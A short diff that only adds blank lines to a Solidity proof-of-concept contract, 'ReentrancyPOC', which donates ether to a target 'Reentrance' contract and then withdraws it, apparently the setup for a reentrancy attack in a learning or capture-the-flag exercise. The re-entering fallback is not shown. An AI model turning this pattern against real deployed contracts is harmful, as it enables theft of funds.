@@ -2,7 +2,9 @@ pragma solidity ^0.8.22;
 
 import "./reentrancy.sol";
 
+
 contract ReentrancyPOC {
+
     Reentrance reentrance;
 
     constructor(address _reentrance) {
@@ -11,6 +13,7 @@ contract ReentrancyPOC {
 
     function exploit() external payable {
         reentrance.donate{value: 0.001 ether}(address(this));
+
         reentrance.withdraw(0.001 ether);
     }
 
